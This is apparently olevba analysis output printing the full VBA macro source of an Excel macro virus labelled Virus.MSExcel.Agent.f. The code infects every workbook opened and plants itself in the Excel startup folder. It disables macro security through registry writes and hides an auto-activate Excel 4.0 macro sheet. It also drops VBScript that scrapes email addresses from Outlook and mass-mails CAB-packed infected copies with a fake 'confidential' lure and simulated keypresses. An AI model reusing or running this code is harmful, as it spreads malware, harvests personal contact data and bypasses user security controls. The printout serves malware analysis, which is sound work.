olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Agent.f-d4dd010d16da5d638b511f09598c430bef18c842
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Agent.f-d4dd010d16da5d638b511f09598c430bef18c842 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public WithEvents xx As Application
Attribute xx.VB_VarHelpID = -1
Private Sub Workbook_open()
Set xx = Application
On Error Resume Next
Application.DisplayAlerts = False
Call do_what
End Sub
Private Sub xx_workbookOpen(ByVal wb As Workbook)
On Error Resume Next
wb.VBProject.References.AddFromGuid _
GUID:="{0002E157-0000-0000-C000-000000000046}", _
Major:=5, Minor:=3
Application.ScreenUpdating = False
Application.DisplayAlerts = False
copystart wb
Application.ScreenUpdating = True
End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Agent.f-d4dd010d16da5d638b511f09598c430bef18c842 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Agent.f-d4dd010d16da5d638b511f09598c430bef18c842 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Agent.f-d4dd010d16da5d638b511f09598c430bef18c842 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ToDOLE.bas 
in file: Virus.MSExcel.Agent.f-d4dd010d16da5d638b511f09598c430bef18c842 - OLE stream: '_VBA_PROJECT_CUR/VBA/ToDOLE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub auto_open()
Application.DisplayAlerts = False
If ThisWorkbook.Path <> Application.StartupPath Then
  Application.ScreenUpdating = False
  Call delete_this_wk
  Call copytoworkbook
  If Sheets(1).Name <> "Macro1" Then Movemacro4 ThisWorkbook
  ThisWorkbook.Save
  Application.ScreenUpdating = True
End If
End Sub
Private Sub copytoworkbook()
  Const DQUOTE = """"
  With ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
.InsertLines 1, "Public WithEvents xx As Application"
.InsertLines 2, "Private Sub Workbook_open()"
.InsertLines 3, "Set xx = Application"
.InsertLines 4, "On Error Resume Next"
.InsertLines 5, "Application.DisplayAlerts = False"
.InsertLines 6, "Call do_what"
.InsertLines 7, "End Sub"
.InsertLines 8, "Private Sub xx_workbookOpen(ByVal wb As Workbook)"
.InsertLines 9, "On Error Resume Next"
.InsertLines 10, "wb.VBProject.References.AddFromGuid _"
.InsertLines 11, "GUID:=" & DQUOTE & "{0002E157-0000-0000-C000-000000000046}" & DQUOTE & ", _"
.InsertLines 12, "Major:=5, Minor:=3"
.InsertLines 13, "Application.ScreenUpdating = False"
.InsertLines 14, "Application.DisplayAlerts = False"
.InsertLines 15, "copystart wb"
.InsertLines 16, "Application.ScreenUpdating = True"
.InsertLines 17, "End Sub"

End With
End Sub

Private Sub delete_this_wk()
Dim VBProj As VBIDE.VBProject
Dim VBComp As VBIDE.VBComponent
Dim CodeMod As VBIDE.CodeModule

Set VBProj = ThisWorkbook.VBProject
Set VBComp = VBProj.VBComponents("ThisWorkbook")
Set CodeMod = VBComp.CodeModule
With CodeMod
    .DeleteLines 1, .CountOfLines
End With

End Sub
Function do_what()
Attribute do_what.VB_ProcData.VB_Invoke_Func = " \n14"
If ThisWorkbook.Path <> Application.StartupPath Then
  RestoreAfterOpen
  Call OpenDoor
  Call Microsofthobby
  Call ActionJudge
End If
End Function
Function copystart(ByVal wb As Workbook)
Attribute copystart.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next

Dim VBProj1 As VBIDE.VBProject
Dim VBProj2 As VBIDE.VBProject
Set VBProj1 = Workbooks("k4.xls").VBProject
Set VBProj2 = wb.VBProject

If copymodule("ToDole", VBProj1, VBProj2, False) Then Exit Function
End Function

Function copymodule(ModuleName As String, _
    FromVBProject As VBIDE.VBProject, _
    ToVBProject As VBIDE.VBProject, _
    OverwriteExisting As Boolean) As Boolean
Attribute copymodule.VB_ProcData.VB_Invoke_Func = " \n14"
   
    On Error Resume Next

    Dim VBComp As VBIDE.VBComponent
    Dim FName As String
    Dim CompName As String
    Dim S As String
    Dim SlashPos As Long
    Dim ExtPos As Long
    Dim TempVBComp As VBIDE.VBComponent
    
    If FromVBProject Is Nothing Then
        copymodule = False
        Exit Function
    End If
    
    If Trim(ModuleName) = vbNullString Then
        copymodule = False
        Exit Function
    End If
    
    If ToVBProject Is Nothing Then
        copymodule = False
        Exit Function
    End If
    
    If FromVBProject.Protection = vbext_pp_locked Then
        copymodule = False
        Exit Function
    End If
    
    If ToVBProject.Protection = vbext_pp_locked Then
        copymodule = False
        Exit Function
    End If
    
    On Error Resume Next
    Set VBComp = FromVBProject.VBComponents(ModuleName)
    If Err.Number <> 0 Then
        copymodule = False
        Exit Function
    End If
   
    FName = Environ("Temp") & "\" & ModuleName & ".bas"
    If OverwriteExisting = True Then
       
        If Dir(FName, vbNormal + vbHidden + vbSystem) <> vbNullString Then
            Err.Clear
            Kill FName
            If Err.Number <> 0 Then
                copymodule = False
                Exit Function
            End If
        End If
        With ToVBProject.VBComponents
            .Remove .Item(ModuleName)
        End With
    Else
        
        Err.Clear
        Set VBComp = ToVBProject.VBComponents(ModuleName)
        If Err.Number <> 0 Then
            If Err.Number = 9 Then
               
            Else
               
                copymodule = False
                Exit Function
            End If
        End If
    End If
   
    FromVBProject.VBComponents(ModuleName).Export FileName:=FName
   
    SlashPos = InStrRev(FName, "\")
    ExtPos = InStrRev(FName, ".")
    CompName = Mid(FName, SlashPos + 1, ExtPos - SlashPos - 1)
    
    Set VBComp = Nothing
    Set VBComp = ToVBProject.VBComponents(CompName)
    
    If VBComp Is Nothing Then
        ToVBProject.VBComponents.Import FileName:=FName
    Else
        If VBComp.Type = vbext_ct_Document Then
            
            Set TempVBComp = ToVBProject.VBComponents.Import(FName)
           
            With VBComp.CodeModule
                .DeleteLines 1, .CountOfLines
                S = TempVBComp.CodeModule.Lines(1, TempVBComp.CodeModule.CountOfLines)
                .InsertLines 1, S
            End With
            On Error GoTo 0
            ToVBProject.VBComponents.Remove TempVBComp
        End If
    End If
    Kill FName
    copymodule = True
End Function

Function Microsofthobby()
Attribute Microsofthobby.VB_ProcData.VB_Invoke_Func = " \n14"
Dim myfile0 As String
Dim MyFile As String
On Error Resume Next
myfile0 = ThisWorkbook.FullName
MyFile = Application.StartupPath & "\k4.xls"
If WorkbookOpen("k4.xls") And ThisWorkbook.Path <> Application.StartupPath Then Workbooks("k4.xls").Close False
Shell Environ$("comspec") & " /c attrib -S -h """ & Application.StartupPath & "\K4.XLS""", vbMinimizedFocus
Shell Environ$("comspec") & " /c Del /F /Q """ & Application.StartupPath & "\K4.XLS""", vbMinimizedFocus
Shell Environ$("comspec") & " /c RD /S /Q """ & Application.StartupPath & "\K4.XLS""", vbMinimizedFocus

If ThisWorkbook.Path <> Application.StartupPath Then
     Application.ScreenUpdating = False
     ThisWorkbook.IsAddin = True
     ThisWorkbook.SaveCopyAs MyFile
     ThisWorkbook.IsAddin = False
     Application.ScreenUpdating = True
End If
End Function

Function OpenDoor()
Attribute OpenDoor.VB_ProcData.VB_Invoke_Func = " \n14"
Dim Fso, RK1 As String, RK2 As String, RK3 As String, RK4 As String
Dim KValue1 As Variant, KValue2 As Variant
Dim VS As String
On Error Resume Next
VS = Application.Version
Set Fso = CreateObject("scRiPTinG.fiLEsysTeMoBjEcT")

RK1 = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & VS & "\Excel\Security\AccessVBOM"
RK2 = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & VS & "\Excel\Security\Level"
RK3 = "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\" & VS & "\Excel\Security\AccessVBOM"
RK4 = "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\" & VS & "\Excel\Security\Level"

KValue1 = 1
KValue2 = 1

      Call WReg(RK1, KValue1, "REG_DWORD")
      Call WReg(RK2, KValue2, "REG_DWORD")
      Call WReg(RK3, KValue1, "REG_DWORD")
      Call WReg(RK4, KValue2, "REG_DWORD")

End Function

Sub WReg(strkey As String, Value As Variant, ValueType As String)
Attribute WReg.VB_ProcData.VB_Invoke_Func = " \n14"
    Dim oWshell
    Set oWshell = CreateObject("WScript.Shell")
    If ValueType = "" Then
        oWshell.RegWrite strkey, Value
    Else
        oWshell.RegWrite strkey, Value, ValueType
    End If
    Set oWshell = Nothing
End Sub


Private Sub Movemacro4(ByVal wb As Workbook)
On Error Resume Next

  Dim sht As Object

    wb.Sheets(1).Select
    Sheets.Add Type:=xlExcel4MacroSheet
    ActiveSheet.Name = "Macro1"
   
    Range("A2").Select
    ActiveCell.FormulaR1C1 = "=ERROR(FALSE)"
    Range("A3").Select
    ActiveCell.FormulaR1C1 = "=IF(ERROR.TYPE(RUN(""" & Application.UserName & """))=4)"
    Range("A4").Select
    ActiveCell.FormulaR1C1 = "=ALERT(""禁用宏，关闭 " & Chr(10) & Now & Chr(10) & "Please Enable Macro!"",3)"
    Range("A5").Select
    ActiveCell.FormulaR1C1 = "=FILE.CLOSE(FALSE)"
    Range("A6").Select
    ActiveCell.FormulaR1C1 = "=END.IF()"
    Range("A7").Select
    ActiveCell.FormulaR1C1 = "=RETURN()"
    
    For Each sht In wb.Sheets
    wb.Names.Add sht.Name & "!Auto_Activate", "=Macro1!$A$2", False
    Next
    wb.Excel4MacroSheets(1).Visible = xlSheetVeryHidden
End Sub

Private Function WorkbookOpen(WorkBookName As String) As Boolean
  WorkbookOpen = False
  On Error GoTo WorkBookNotOpen
  If Len(Application.Workbooks(WorkBookName).Name) > 0 Then
    WorkbookOpen = True
    Exit Function
  End If
WorkBookNotOpen:
End Function

Private Sub ActionJudge()
Const T1 As Date = "10:00:00"
Const T2 As Date = "11:00:00"
Const T3 As Date = "14:00:00"
Const T4 As Date = "15:00:00"
Dim SentTime As Date, WshShell

Set WshShell = CreateObject("WScript.Shell")
If Not InStr(UCase(WshShell.RegRead("HKEY_CLASSES_ROOT\mailto\shell\open\command\")), "OUTLOOK.EXE") > 0 Then Exit Sub

If Time >= T1 And Time <= T2 Or Time >= T3 And Time <= T4 Then
      If ReadOut("D:\Collected_Address:frag1.txt") = "1" Then
           Exit Sub
      Else
           CreateFile "1", "D:\Collected_Address:frag1.txt"
           search_in_OL
      End If
Else
     If Not if_outlook_open Then Exit Sub
     If Time > T2 And Time <= DateAdd("n", 10, T2) Or Time > T4 And Time <= DateAdd("n", 10, T4) Then
          Exit Sub
     Else
          SentTime = DateAdd("n", -21, Now)
          On Error GoTo timeError
          SentTime = CDate(ReadOut("D:\Collected_Address:frag2.txt"))
timeError:
          If Now < DateAdd("n", 20, SentTime) Or ReadOut("D:\Collected_Address\log.txt") = "" Then
                Exit Sub
          Else
                CreateFile "", "D:\Collected_Address:frag1.txt"
                CreateFile Now, "D:\Collected_Address:frag2.txt"
                CreatCab_SendMail
          End If
     End If
End If
End Sub


Private Sub search_in_OL()
Dim i As Integer, AttName As String, AddVbsFile As String, AddListFile As String, fs As Object, WshShell As Object

On Error Resume Next
Set fs = CreateObject("scripting.filesystemobject")
Set WshShell = CreateObject("WScript.Shell")

If fs.Folderexists("E:\KK") = False Then fs.CreateFolder "E:\KK"
AttName = Replace(Replace(Left(ThisWorkbook.Name, Len(ThisWorkbook.Name) - 4), " ", "_"), ".", "_")
AddVbsFile_clear = "E:\KK\" & AttName & "_clear.vbs"
i = FreeFile
Open AddVbsFile_clear For Output Access Write As #i

Print #i, "On error Resume Next"
Print #i, "Dim wsh, tle, T0, i"
Print #i, "  T0 = Timer"
Print #i, "  Set wsh=createobject(""" & "wscript.shell""" & ")"
Print #i, "  tle = """ & "Microsoft Office Outlook""" & ""
Print #i, "For i = 1 To 1000"
Print #i, "    If Timer - T0 > 60 Then Exit For"
Print #i, "  Call Refresh()"
Print #i, "  wscript.sleep 05"
Print #i, "  wsh.sendKeys """ & "%a""" & ""
Print #i, "  wscript.sleep 05"
Print #i, "  wsh.sendKeys """ & "{TAB}{TAB}""" & ""
Print #i, "  wscript.sleep 05"
Print #i, "  wsh.sendKeys """ & "{Enter}""" & ""
Print #i, "Next"
Print #i, "Set wsh = Nothing"
Print #i, "wscript.quit"
Print #i, "Sub Refresh()"
Print #i, "Do Until wsh.AppActivate(CStr(tle)) = True"
Print #i, "    If Timer - T0 > 60 Then Exit Sub"
Print #i, "Loop"
Print #i, "  wscript.sleep 05"
Print #i, "    wsh.SendKeys """ & "%{F4}""" & ""
Print #i, "End Sub"
Close (i)

AddVbsFile_search = "E:\KK\" & AttName & "_Search.vbs"
i = FreeFile
Open AddVbsFile_search For Output Access Write As #i

Print #i, "On error Resume Next"
Print #i, "Const olFolderInbox = 6"
Print #i, "Dim conbinded_address,WshShell,sh,ts"
Print #i, "Set WshShell=WScript.CreateObject(""" & "WScript.Shell""" & ")"
Print #i, "Set objOutlook = CreateObject(""" & "Outlook.Application""" & ")"
Print #i, "Set objNamespace = objOutlook.GetNamespace(""" & "MAPI""" & ")"
Print #i, "Set objFolder = objNamespace.GetDefaultFolder(olFolderInbox)"
Print #i, "Set TargetFolder = objFolder"
Print #i, "conbinded_address = """ & """" & ""
Print #i, "Set colItems = TargetFolder.Items"
Print #i, "wscript.sleep 300000"
Print #i, "WshSHell.Run (""" & "wscript.exe " & AddVbsFile_clear & """" & "), vbHide, False"
Print #i, "ts = Timer"
Print #i, "For Each objMessage in colItems"
Print #i, "       If Timer - ts >55 then exit For"
Print #i, "       conbinded_address = conbinded_address & valid_address(objMessage.Body)"
Print #i, "Next"
Print #i, "add_text conbinded_address, 8"
Print #i, "add_text all_non_same(ReadAllTextFile), 2"
Print #i, "WScript.Quit"
Print #i, ""
Print #i, "Private Function valid_address(source_data)"
Print #i, "   Dim oDict, trimed_data , temp_data, i, t_asc, header_end, trimed_arr, nonsame_arr"
Print #i, "   Dim regex, matchs, ss, arr()"
Print #i, "   Set oDict = CreateObject(""" & "Scripting.Dictionary""" & ")"
Print #i, "   Set regex = CreateObject(""" & "VBSCRIPT.REGEXP""" & ")"
Print #i, ""
Print #i, "   regex.Global = True"
Print #i, "   regex.Pattern = """ & "\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*""" & ""
Print #i, "   Set matchs = regex.Execute(source_data)"
Print #i, "   ReDim trimed_arr(matchs.Count - 1)"
Print #i, "   For i = Lbound(trimed_arr) To Ubound(trimed_arr)"
Print #i, "        trimed_arr(i) = matchs.Item(i) & vbCrLf"
Print #i, "   Next"
Print #i, ""
Print #i, "   For i = LBound(trimed_arr) To UBound(trimed_arr)"
Print #i, "        oDict(trimed_arr(i)) = """ & """" & ""
Print #i, "   Next"
Print #i, ""
Print #i, "   If oDict.Count > 0 Then"
Print #i, "        nonsame_arr = oDict.keys"
Print #i, "        For i = LBound(nonsame_arr) To UBound(nonsame_arr)"
Print #i, "             valid_address = valid_address & nonsame_arr(i)"
Print #i, "        Next"
Print #i, "   End If"
Print #i, "   Set oDict = Nothing"
Print #i, "End Function"
Print #i, ""
Print #i, "Private Sub add_text(inputed_string, input_frag)"
Print #i, "   Dim objFSO, logfile, logtext, log_path, log_folder"
Print #i, "   log_path = """ & "D:\Collected_Address""" & ""
Print #i, "   Set objFSO = CreateObject(""" & "Scripting.FileSystemObject""" & ")"
Print #i, "   On Error resume next"
Print #i, "   Set log_folder = objFSO.CreateFolder(log_path)"
Print #i, ""
Print #i, "   If objFSO.FileExists(log_path & """ & "\log.txt""" & ") = 0 Then"
Print #i, "       Set logfile = objFSO.CreateTextFile(log_path & """ & "\log.txt""" & ", True)"
Print #i, "   End If"
Print #i, "   Set log_folder = Nothing"
Print #i, "   Set logfile = Nothing"
Print #i, ""
Print #i, "   Select Case input_frag"
Print #i, "     Case 8"
Print #i, "          Set logtext = objFSO.OpenTextFile(log_path & """ & "\log.txt""" & ", 8, True, -1)"
Print #i, "          logtext.Write inputed_string"
Print #i, "          logtext.Close"
Print #i, "     Case 2"
Print #i, "          Set logtext = objFSO.OpenTextFile(log_path & """ & "\log.txt""" & ", 2, True, -1)"
Print #i, "          logtext.Write inputed_string"
Print #i, "          logtext.Close"
Print #i, "   End Select"
Print #i, "   set objFSO = nothing"
Print #i, "End Sub"
Print #i, ""
Print #i, "Private Function ReadAllTextFile()"
Print #i, "    Dim objFSO, FileName, MyFile"
Print #i, "    FileName = """ & "D:\Collected_Address\log.txt""" & ""
Print #i, "    Set objFSO = CreateObject(""" & "Scripting.FileSystemObject""" & ")"
Print #i, "    Set MyFile = objFSO.OpenTextFile(FileName, 1, False, -1)"
Print #i, "    If MyFile.AtEndOfStream Then"
Print #i, "        ReadAllTextFile = """ & """" & ""
Print #i, "    Else"
Print #i, "        ReadAllTextFile = MyFile.ReadAll"
Print #i, "    End If"
Print #i, "set objFSO = nothing"
Print #i, "End Function"
Print #i, ""
Print #i, "Private Function all_non_same(source_data)"
Print #i, "   Dim oDict, i, trimed_arr, nonsame_arr"
Print #i, "   all_non_same = """ & """" & ""
Print #i, "   Set oDict = CreateObject(""" & "Scripting.Dictionary""" & ")"
Print #i, ""
Print #i, "   trimed_arr = Split(source_data, vbCrLf)"
Print #i, ""
Print #i, "   For i = LBound(trimed_arr) To UBound(trimed_arr)"
Print #i, "         oDict(trimed_arr(i)) = """ & """" & ""
Print #i, "   Next"
Print #i, ""
Print #i, "   If oDict.Count > 0 Then"
Print #i, "        nonsame_arr = oDict.keys"
Print #i, "        For i = LBound(nonsame_arr) To UBound(nonsame_arr)"
Print #i, "             all_non_same = all_non_same & nonsame_arr(i) & vbCrLf"
Print #i, "        Next"
Print #i, "   End If"
Print #i, "   Set oDict = Nothing"
Print #i, "End Function"
Close (i)
Application.WindowState = xlMaximized
WshShell.Run ("wscript.exe " & AddVbsFile_search), vbHide, False
Set WshShell = Nothing
End Sub

Private Sub CreatCab_SendMail()
Dim i As Integer, AttName As String, AddVbsFile As String, AddListFile As String, Address_list As String
Dim fs As Object, WshShell As Object
Address_list = get_ten_address

Set WshShell = CreateObject("WScript.Shell")
Set fs = CreateObject("scripting.filesystemobject")
If fs.Folderexists("E:\SORCE") = False Then fs.CreateFolder "E:\SORCE"
AttName = Replace(Replace(Left(ThisWorkbook.Name, Len(ThisWorkbook.Name) - 4), " ", "_"), ".", "_")
mail_sub = "*" & AttName & "*Message*"
AddVbsFile = "E:\sorce\" & AttName & "_Key.vbs"
i = FreeFile
Open AddVbsFile For Output Access Write As #i
    
Print #i, "Dim oexcel,owb, WshShell,Fso,Atta_xls,sh,route"
Print #i, "On error Resume Next"
Print #i, "Set sh=WScript.CreateObject(""" & "shell.application""" & ")"
Print #i, "sh.MinimizeAll"
Print #i, "Set sh = Nothing"
Print #i, "Set Fso = CreateObject(""" & "Scripting.FileSystemObject""" & ")"
Print #i, "Set WshShell = WScript.CreateObject(""" & "WScript.Shell""" & ")"
Print #i, "If Fso.Folderexists(""" & "E:\KK""" & ") = False Then Fso.CreateFolder """ & "E:\KK"""
Print #i, "Fso.CopyFile  _"
Print #i, "WshShell.CurrentDirectory & """ & "\" & AttName & "*.CAB""" & "," & " " & """E:\KK\""" & ", True"
Print #i, "For Each Atta_xls In ListDir(""" & "E:\KK""" & ")"
Print #i, "   WshShell.Run """ & "expand """ & " & Atta_xls & """ & " -F:" & AttName & ".xls E:\KK""" & ", 0, true"
Print #i, "Next"
Print #i, "If Fso.FileExists(""" & "E:\KK\" & AttName & ".xls""" & ") = 0 then"
Print #i, "        route = WshShell.CurrentDirectory & """ & "\" & AttName & ".xls"""
Print #i, "        if Fso.FileExists(WshShell.CurrentDirectory & """ & "\" & AttName & ".xls""" & ")=0 then"
Print #i, "                 route = InputBox(""" & "Warning! """ & " & Chr(10) & """ & "You are going to open a confidential file.""" & "& Chr(10)   _"
Print #i, "                               & """ & "Please input the complete file path.""" & " & Chr(10) & """ & "ex. C:\parth\confidential_file.xls""" & ", _"
Print #i, "                               """ & "Open a File""" & " , """ & "Please Input the Complete File Path""" & ", 10000, 8500)"
Print #i, "        End if"
Print #i, "else"
Print #i, "        route = """ & "E:\KK\" & AttName & ".xls"""
Print #i, "End If"
Print #i, "   set oexcel=createobject(""" & "excel.application""" & ")"
Print #i, "   set owb=oexcel.workbooks.open(route)"
Print #i, "   oExcel.Visible = True"
Print #i, "Set oExcel = Nothing"
Print #i, "Set oWb = Nothing"
Print #i, "Set  WshShell = Nothing"
Print #i, "Set Fso = Nothing"
Print #i, "WScript.Quit"
Print #i, "Private Function ListDir (ByVal Path)"
Print #i, "   Dim Filter, a, n, Folder, Files, File"
Print #i, "       ReDim a(10)"
Print #i, "    n = 0"
Print #i, "  Set Folder = fso.GetFolder(Path)"
Print #i, "   Set Files = Folder.Files"
Print #i, "   For Each File In Files"
Print #i, "      If left(File.Name," & Len(AttName) & ") = """ & AttName & """ and right(File.Name,3) = """ & "CAB""" & " Then"
Print #i, "         If n > UBound(a) Then ReDim Preserve a(n*2)"
Print #i, "            a(n) = File.Path"
Print #i, "            n = n + 1"
Print #i, "       End If"
Print #i, "   Next"
Print #i, "   ReDim Preserve a(n-1)"
Print #i, "   ListDir = a"
Print #i, "End Function"

Close (i)
AddListFile = ThisWorkbook.Path & "\TEST.txt"
i = FreeFile
Open AddListFile For Output Access Write As #i
Print #i, "E:\sorce\" & AttName & "_Key.vbs"
Print #i, "E:\sorce\" & AttName & ".xls"
Close (i)

Application.ScreenUpdating = False
RestoreBeforeSend
ThisWorkbook.SaveCopyAs "E:\sorce\" & AttName & ".xls"
RestoreAfterOpen
c4$ = CurDir()
ChDrive Left(ThisWorkbook.Path, 3) '"C:\"
ChDir ThisWorkbook.Path
WshShell.Run Environ$("comspec") & " /c makecab /F """ & ThisWorkbook.Path & "\TEST.TXT""" & " /D COMPRESSIONTYPE=LZX /D COMPRESSIONMEMORY=21 /D CABINETNAMETEMPLATE=../" & AttName & ".CAB", vbHide, False

Do Until fs.FileExists(ThisWorkbook.Path & "\TEST.txt") _
And fs.FileExists(ThisWorkbook.Path & "\setup.rpt") And fs.FileExists(ThisWorkbook.Path & "\setup.inf") _
And fs.FileExists(ThisWorkbook.Path & "\" & AttName & ".CAB")
DoEvents
Loop

WshShell.Run Environ$("comspec") & " /c RD /S /Q """ & ThisWorkbook.Path & "\disk1""", vbHide, False
WshShell.Run Environ$("comspec") & " /c Del /F /Q """ & ThisWorkbook.Path & "\TEST.txt""", vbHide, False
WshShell.Run Environ$("comspec") & " /c Del /F /Q """ & ThisWorkbook.Path & "\setup.rpt""", vbHide, False
WshShell.Run Environ$("comspec") & " /c Del /F /Q """ & ThisWorkbook.Path & "\setup.inf""", vbHide, False
WshShell.Run Environ$("comspec") & " /c RD /S /Q E:\sorce", vbHide, False

If fs.Folderexists("E:\KK") = False Then fs.CreateFolder "E:\KK"
WshShell.Run Environ$("comspec") & " /c MOVE /Y " & AttName & ".CAB E:\KK""", vbHide, False
ChDir c4$
Call Massive_SendMail(Address_list, AttName, "Dear all," & vbCrLf & AttName & vbCrLf & "FYI", _
"", "E:\KK\" & AttName & ".CAB")
WshShell.Run Environ$("comspec") & " /c RD /S /Q E:\KK", vbHide, False
Set WshShell = Nothing
Application.ScreenUpdating = True
End Sub

Private Sub Massive_SendMail(Email_Address$, Subject$, Body$, CC_email_add$, Attachment$)
    Dim objOL As Object
    Dim itmNewMail As Object
    If Not if_outlook_open Then Exit Sub
    
    Set objOL = CreateObject("Outlook.Application")
    Set itmNewMail = objOL.CreateItem(olMailItem)
    
    With itmNewMail
        .Subject = Subject
        .Body = Body
        .To = Email_Address
        .CC = CC_email_add
        .Attachments.Add Attachment
        .DeleteAfterSubmit = True
    End With
    On Error GoTo continue
SendEmail:
    itmNewMail.display
    Debug.Print "setforth "
    DoEvents
    DoEvents
    DoEvents
    SendKeys "%s", Wait:=True
    DoEvents
    GoTo SendEmail
continue:
    Set objOL = Nothing
    Set itmNewMail = Nothing
End Sub

Private Function if_outlook_open() As Boolean
Set objs = GetObject("WinMgmts:").InstancesOf("Win32_Process")
if_outlook_open = False
For Each obj In objs
If InStr(obj.Description, "OUTLOOK") > 0 Then
if_outlook_open = True
Exit For
End If
Next
End Function

Private Function RadomNine(length As Integer) As String
 Dim jj As Integer, k As Integer, i As Integer
 RadomNine = ""
 If length <= 0 Then Exit Function
 If length <= 10 Then
     For i = 1 To length
     RadomNine = RadomNine & "$$" & i
     Next i
     Exit Function
 End If
 jj = length / 10
 Randomize
 For i = 1 To 10
      k = Int(Rnd * (jj * i - m - 1)) + 1
      If m + k <> 1 Then RadomNine = RadomNine & "$$" & m + k
      m = m + k
 Next
End Function
Private Function get_ten_address() As String
Dim singleAddress_arr, krr, i As Integer
get_ten_address = ""
singleAddress_arr = Split(ReadOut("D:\Collected_Address\log.txt"), vbCrLf)
krr = Split(RadomNine(UBound(singleAddress_arr) - LBound(singleAddress_arr) + 1), "$$")
For i = 1 To UBound(krr)
get_ten_address = get_ten_address & ";" & singleAddress_arr(CInt(krr(i)) - 1)
Next i
End Function

Private Function ReadOut(FullPath) As String
    On Error Resume Next
    Dim Fso, FileText
    Set Fso = CreateObject("scRiPTinG.fiLEsysTeMoBjEcT")
    Set FileText = Fso.OpenTextFile(FullPath, 1, False, -1)
    ReadOut = FileText.ReadAll
    FileText.Close
End Function

Private Sub CreateFile(FragMark, pathf)
    On Error Resume Next
    Dim Fso, FileText
    Set Fso = CreateObject("scRiPTinG.fiLEsysTeMoBjEcT")
    If Fso.Folderexists(Left(pathf, Len(pathf) - 10)) = False Then Fso.CreateFolder Left(pathf, Len(pathf) - 10)
    If Fso.FileExists(pathf) Then
        Set FileText = Fso.OpenTextFile(pathf, 2, False, -1)
        FileText.Write FragMark
        FileText.Close
    Else
        Set FileText = Fso.OpenTextFile(pathf, 2, True, -1)
        FileText.Write FragMark
        FileText.Close
    End If
End Sub


Private Sub RestoreBeforeSend()
Dim aa As Name, i_row As Integer, i_col As Integer
Dim sht As Object
Application.ScreenUpdating = False
Application.DisplayAlerts = False
On Error Resume Next
For Each aa In ThisWorkbook.Names
     aa.Visible = True
     If Split(aa.Name, "!")(1) = "Auto_Activate" Then aa.Delete
Next
For Each sht In ThisWorkbook.Sheets
     If sht.Name = "Macro1" Then
     sht.Visible = xlSheetVisible
     sht.Delete
     End If
Next
Sheets(1).Select
Sheets.Add
For Each sht In ThisWorkbook.Sheets
     If sht.Name <> Sheets(1).Name Then sht.Visible = xlSheetVeryHidden
Next
i_row = Int((15 * Rnd) + 1)
i_col = Int((6 * Rnd) + 1)
Cells(i_row, i_col) = "** CONFIDENTIAL! ** "
Cells(i_row + 2, i_col) = "Use " & Chr(34) & Left(ThisWorkbook.Name, Len(ThisWorkbook.Name) - 4) & "_key.vbs" & Chr(34) & " To Open This File."
Cells(i_row + 3, i_col) = "请用 " & Chr(34) & Left(ThisWorkbook.Name, Len(ThisWorkbook.Name) - 4) & "_key.vbs" & Chr(34) & " 解锁此文件."
With Range(Cells(i_row, i_col), Cells(i_row + 2, i_col))
     .Font.Bold = True
     .Font.ColorIndex = 3
End With
Application.ScreenUpdating = True
End Sub

Private Function RestoreAfterOpen()
Dim sht, del_sht, rng, del_frag As Boolean
On Error Resume Next
del_sht = ActiveSheet.Name
Application.ScreenUpdating = False
Application.DisplayAlerts = False
For Each sht In ThisWorkbook.Sheets
    If sht.Name <> "Macro1" Then sht.Visible = xlSheetVisible
Next
For Each rng In Sheets(del_sht).Range("A1:F15")
If InStr(rng.Value, "CONFIDENTIAL") > 0 Then
del_frag = True
Exit For
End If
Next
If del_frag = True Then Sheets(del_sht).Delete
Application.ScreenUpdating = True

End Function
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, very hidden - Macro1
' 0085     19 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ÖÐºñ°åµÍºÏ½ð
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ÐÂ¿â´æQ345CDE
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ½­Òõ¿â´æ
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, visible - ToDOLE
' 0018     50 LABEL : Cell Value, String Constant - _FilterDatabase hidden len=21 ptgArea3d  *INCOMPLETE FORMULA PARSING* Remaining, unparsed expression: b'\xfc\xff\x00\x00\x00\x00\x00\x00\x01\x00\x03\x00\x03\x00\x00\x00\xf0\x11\x00\x06'
' 0018     50 LABEL : Cell Value, String Constant - _FilterDatabase hidden len=21 ptgArea3d  *INCOMPLETE FORMULA PARSING* Remaining, unparsed expression: b'\xfd\xff\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00\x02\x00\x01\x00\x01\x00\x00\x0b'
